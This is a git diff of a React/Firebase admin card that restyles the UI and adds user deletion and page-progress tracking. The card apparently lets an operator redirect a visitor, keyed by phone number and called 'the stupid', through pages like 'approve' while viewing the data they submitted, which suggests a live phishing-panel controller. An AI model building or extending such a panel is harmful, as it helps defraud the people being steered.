@@ -1,10 +1,16 @@
+import { arrayUnion, deleteDoc, doc } from "firebase/firestore";
 import React, { useState } from "react";
+import { db } from "../firebase";
 
 function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
   [];
   const [isController, setIsController] = useState(true);
   const [code, setCode] = useState(null);
   const [redirect, setRedirect] = useState(null);
+
+  const deleteUser = async (id) => {
+    await deleteDoc(doc(db, "admin", id));
+  };
 
   const toggleTab = (isControl) => {
     setIsController(isControl);
@@ -13,10 +19,18 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
   return (
     <div
       key={ctr?.id}
-      className="w-full bg-white border border-gray-200 rounded-lg shadow dark:bg-gray-800 dark:border-gray-700"
+      className={` ${
+        ctr.loading
+          ? "bg-green-700 border-green-800 bg-opacity-80"
+          : "bg-gray-800 border-gray-700"
+      } w-full border rounded-lg shadow  mb-1`}
     >
       <ul
-        className="flex flex-wrap text-sm font-medium text-center text-gray-500 border-b border-gray-200 rounded-t-lg bg-gray-50 dark:border-gray-700 dark:text-gray-400 dark:bg-gray-800"
+        className={` ${
+          ctr.loading
+            ? "bg-green-900 border-green-900 text-white"
+            : "bg-gray-700 border-gray-600"
+        } flex flex-wrap text-sm font-medium text-center  border-b  rounded-t-lg   text-gray-400 relative`}
         id="defaultTab"
         data-tabs-toggle="#defaultTabContent"
         role="tablist"
@@ -29,7 +43,7 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
             role="tab"
             className={`inline-block p-4 ${
               isController ? "text-blue-600" : "text-gray-300"
-            } rounded-tl-lg hover:bg-gray-100 dark:bg-gray-800 dark:hover:bg-gray-700 `}
+            } rounded-tl-lg  bg-gray-800 hover:bg-gray-700 `}
           >
             Controller
           </button>
@@ -45,7 +59,7 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
             aria-selected="false"
             className={`inline-block p-4 ${
               !isController ? "text-blue-600" : "text-gray-300"
-            } hover:text-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-gray-300`}
+            }  hover:bg-gray-700 hover:text-gray-300`}
           >
             DATA
           </button>
@@ -58,7 +72,7 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
             role="tab"
             aria-controls="services"
             aria-selected="false"
-            className={`inline-block p-4  hover:text-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-gray-300`}
+            className={`inline-block p-4   hover:bg-gray-700 hover:text-gray-300`}
           >
             PHONE : {ctr?.id}
           </button>
@@ -78,7 +92,7 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
             role="tab"
             aria-controls="services"
             aria-selected="false"
-            className={`inline-block p-4  hover:text-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-gray-300`}
+            className={`inline-block p-4   hover:bg-gray-700 hover:text-gray-300`}
           >
             FILES
           </button>
@@ -91,13 +105,38 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
             role="tab"
             aria-controls="services"
             aria-selected="false"
-            className={`inline-block p-4  hover:text-gray-600 hover:bg-gray-100 dark:hover:bg-gray-700 dark:hover:text-gray-300`}
+            className={`inline-block p-4   hover:bg-gray-700 hover:text-gray-300`}
           >
-            {ctr?.loading ? (
-              <h3>He is Waiting </h3>
-            ) : (
-              <h3>Current : {ctr.link}</h3>
-            )}
+            {new Date(ctr.date).toUTCString()}
+          </button>
+        </li>
+        <li className="mr-2 absolute right-1">
+          <button
+            onClick={() => deleteUser(ctr.id)}
+            id="services-tab"
+            data-tabs-target="#services"
+            type="button"
+            role="tab"
+            aria-controls="services"
+            aria-selected="false"
+            className={`inline-block pt-4  hover:text-red-600`}
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width={24}
+              height={24}
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              strokeWidth={2}
+              strokeLinecap="round"
+              strokeLinejoin="round"
+              className="feather feather-x-circle"
+            >
+              <circle cx={12} cy={12} r={10} />
+              <line x1={15} y1={9} x2={9} y2={15} />
+              <line x1={9} y1={9} x2={15} y2={15} />
+            </svg>
           </button>
         </li>
       </ul>
@@ -105,7 +144,7 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
         <div
           className={`${
             isController ? "" : "hidden"
-          } p-4 bg-white rounded-lg md:p-8 dark:bg-gray-800 flex lg:flex-row md:flex-row sm:flex-col lg:gap-28 md:gap-5 gap-1 flex-col`}
+          } p-4  rounded-lg md:p-8 flex lg:flex-row md:flex-row sm:flex-col lg:gap-28 md:gap-5 gap-1 flex-col`}
           id="about"
           role="tabpanel"
           aria-labelledby="about-tab"
@@ -114,9 +153,21 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
             {pages.map((page, idx) => (
               <button
                 key={idx}
-                onClick={() => redirectThestupid(ctr?.id, { link: page })}
+                onClick={() =>
+                  redirectThestupid(ctr?.id, {
+                    link: page,
+                    pagesDone:
+                      page == "approve" ? arrayUnion("approve") : ctr.pagesDone,
+                  })
+                }
                 type="button"
-                className="text-white lg:text-sm bg-gradient-to-r from-purple-500 via-purple-600 to-purple-700 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-purple-300 dark:focus:ring-purple-800 shadow-lg shadow-purple-500/50 dark:shadow-lg dark:shadow-purple-800/80 font-medium rounded-lg text-sm px-5 py-2.5 text-center"
+                className={`${
+                  ctr?.pagesDone && ctr?.pagesDone?.includes(page)
+                    ? "bg-yellow-200 text-black"
+                    : ctr?.link == page
+                    ? "bg-green-300 text-black"
+                    : "bg-purple-600 text-white"
+                } lg:text-sm bg-gradient-to-r hover:bg-gradient-to-br focus:ring-4 focus:outline-none   shadow-lg shadow-purple-800/80 font-medium rounded-lg text-sm px-5 py-2.5 text-center`}
               >
                 {page}
               </button>
@@ -184,19 +235,16 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
         <div
           className={`${
             !isController ? "" : "hidden"
-          } p-4 bg-white rounded-lg md:p-8 dark:bg-gray-800`}
+          } p-4 rounded-lg md:p-8 bg-gray-800`}
           id="services"
           role="tabpanel"
           aria-labelledby="services-tab"
         >
-          <h2 className="mb-5 text-2xl font-extrabold tracking-tight text-gray-900 dark:text-white">
+          <h2 className="mb-5 text-2xl font-extrabold tracking-tight  text-white">
             We invest in the world’s potential
           </h2>
           {/* List */}
-          <ul
-            role="list"
-            className="space-y-4 text-gray-500 dark:text-gray-400"
-          >
+          <ul role="list" className="space-y-4  text-gray-400">
             {(getPassedUserData(ctr?.id) || []).map((tab) => {
               const keys = Array.from(new Set(Object.keys(tab)));
               const values = Array.from(new Set(Object.values(tab)));
@@ -204,7 +252,7 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
                 <li key={idx} className="flex space-x-2">
                   {/* Icon */}
                   <svg
-                    className="flex-shrink-0 w-4 h-4 text-blue-600 dark:text-blue-500"
+                    className="flex-shrink-0 w-4 h-4  text-blue-500"
                     fill="currentColor"
                     viewBox="0 0 20 20"
                     xmlns="http://www.w3.org/2000/svg"
@@ -225,27 +273,23 @@ function AdminCard({ ctr, redirectThestupid, getPassedUserData, pages }) {
           </ul>
         </div>
         <div
-          className="hidden p-4 bg-white rounded-lg md:p-8 dark:bg-gray-800"
+          className="hidden p-4  rounded-lg md:p-8 bg-gray-800"
           id="statistics"
           role="tabpanel"
           aria-labelledby="statistics-tab"
         >
-          <dl className="grid max-w-screen-xl grid-cols-2 gap-8 p-4 mx-auto text-gray-900 sm:grid-cols-3 xl:grid-cols-6 dark:text-white sm:p-8">
+          <dl className="grid max-w-screen-xl grid-cols-2 gap-8 p-4 mx-auto  sm:grid-cols-3 xl:grid-cols-6 text-white sm:p-8">
             <div className="flex flex-col">
               <dt className="mb-2 text-3xl font-extrabold">73M+</dt>
-              <dd className="text-gray-500 dark:text-gray-400">Developers</dd>
+              <dd className=" text-gray-400">Developers</dd>
             </div>
             <div className="flex flex-col">
               <dt className="mb-2 text-3xl font-extrabold">100M+</dt>
-              <dd className="text-gray-500 dark:text-gray-400">
-                Public repositories
-              </dd>
+              <dd className=" text-gray-400">Public repositories</dd>
             </div>
             <div className="flex flex-col">
               <dt className="mb-2 text-3xl font-extrabold">1000s</dt>
-              <dd className="text-gray-500 dark:text-gray-400">
-                Open source projects
-              </dd>
+              <dd className=" text-gray-400">Open source projects</dd>
             </div>
           </dl>
         </div>
